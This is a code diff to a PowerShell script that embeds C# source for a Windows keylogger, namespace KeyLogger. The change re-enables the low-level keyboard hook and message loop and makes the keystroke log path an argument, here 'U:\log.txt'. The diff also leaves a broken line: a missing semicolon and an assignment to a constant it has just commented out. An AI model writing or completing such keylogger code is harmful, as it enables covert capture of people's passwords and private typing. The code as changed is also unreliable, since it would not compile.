@@ -11,20 +11,20 @@ namespace KeyLogger {
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
 
-    private const string logFileName = "U:\\log.txt";
+    /*private const string logFileName = "U:\\log.txt";*/
     private static StreamWriter logFile;
 
     private static HookProc hookProc = HookCallback;
     private static IntPtr hookId = IntPtr.Zero;
 
     public static void Main(string[] args) {
-      /*logFileName = logFilePath;*/
-      logFile = File.AppendText(logFileName);/*
+      logFileName = args[0]
+      logFile = File.AppendText(logFileName);
       logFile.AutoFlush = true;
 
       hookId = SetHook(hookProc);
       Application.Run();
-      UnhookWindowsHookEx(hookId);*/
+      UnhookWindowsHookEx(hookId);
       System.Console.WriteLine(args[0]);
     }
 
@@ -59,4 +59,4 @@ namespace KeyLogger {
 }
 "@ -ReferencedAssemblies System.Windows.Forms
 
-[KeyLogger.Program]::Main("log.txt");
+[KeyLogger.Program]::Main("U:\log.txt");
